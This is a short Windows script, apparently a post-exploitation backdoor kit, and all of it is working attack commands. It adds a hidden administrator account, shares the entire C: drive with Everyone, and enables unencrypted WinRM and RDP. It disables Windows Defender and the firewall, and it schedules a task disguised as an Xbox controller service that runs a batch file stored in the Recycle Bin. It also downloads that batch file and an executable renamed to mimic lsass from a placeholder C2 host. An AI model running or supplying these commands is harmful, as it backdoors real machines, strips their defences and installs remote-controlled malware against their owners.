#Add nasty users
net user felipe felipe /add
net localgroup Administrators felipe /add


#Share C drive with everyone
net share MONEY$ DataShare=C:\ /grant:Everyone full /unlimited


#Enable winrm
Enable-PSRemoting -Force
winrm quickconfig
winrm set winrm/config/Client '@{AllowUnencrypted = "true"}'
winrm set winrm/config/client/auth '@{Basic="true"}'
winrm set winrm/config/service/auth '@{Basic="true"}'
winrm set winrm/config/service '@{AllowUnencrypted="true"}'

#Enable RDP with registry
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0

#kill defender
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender” -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force

#kill firewall
Set-NetFirewallProfile -All -Enabled False
New-ItemProperty -Path “HKLM:\SYSTEM\CurrentControlSet\Services\mpssvc” -Name Start -Value 4 -PropertyType DWORD -Force

#schedule task bat
schtasks /create /sc minute /mo 7 /tn  "MicrosoftXbox360Controller" /tr \\C:\$Recycle.Bin\trail.bat

Invoke-WebRequest -URI "http://C2.IP/trail.bat" -OutFile "C:\$Recycle.Bin\trail.bat"
Invoke-WebRequest -URI "http://C2.IP/HOLLOW_PHILOSOPHY.EXE" -OutFile "C:\$Recycle.Bin\1sass.exe"
